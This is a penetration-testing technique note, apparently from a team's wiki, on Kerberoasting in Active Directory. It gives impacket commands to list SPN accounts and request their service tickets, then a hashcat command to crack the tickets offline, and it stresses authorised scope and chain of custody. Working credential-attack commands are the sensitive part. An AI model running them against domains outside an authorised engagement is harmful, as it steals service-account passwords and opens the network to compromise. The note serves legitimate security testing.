---
title: Kerberoasting (request SPN tickets, crack offline)
slug: kerberoasting
category: techniques
updated: 2026-11-18
summary: "Request TGS tickets for service accounts with an SPN and crack them offline; authorised scope only"
tags: [ad, kerberos, kerberoast, impacket, hashcat, credentials]
sensitive: false
---

# Kerberoasting (request SPN tickets, crack offline)

## When to use
You hold any valid domain account (`USER:PASS` or a session). Some accounts have a
service principal name (SPN). Their service tickets are encrypted with the account's
password hash, so you can ask for them and crack them offline.

Preconditions: a valid domain user, the DC reachable on 88/TCP, and the target
accounts listed in scope.

## Key facts / commands
```bash
# List accounts that have an SPN (read-only LDAP query)
GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC_IP

# Request the tickets and save them in hashcat format
GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.hashes

# Crack offline (mode 13100 = Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 kerberoast.hashes wordlist.txt
```

## Gotchas
- The ticket request is a normal authentication event. Offline cracking adds no
  traffic to the target, but the request itself is logged.
- Cracking is only allowed on hashes you captured within scope. Do not run online
  guessing against the service account; that is a brute-force action and needs
  separate approval.
- Accounts with AES-only encryption (etype 18) crack much more slowly. Check the
  hash prefix before you plan the time budget.
- An empty result is not proof that no service account exists: check for LDAP
  paging limits with a larger page size.

## Cleanup / rollback
- Nothing is changed on the target. Store the captured hashes only under the
  engagement's gitignored loot folder, and record hash, source account and time
  for chain of custody.

## References
- Related: [[service-enumeration]], [[sql-injection]]
- Impacket and hashcat documentation (public).
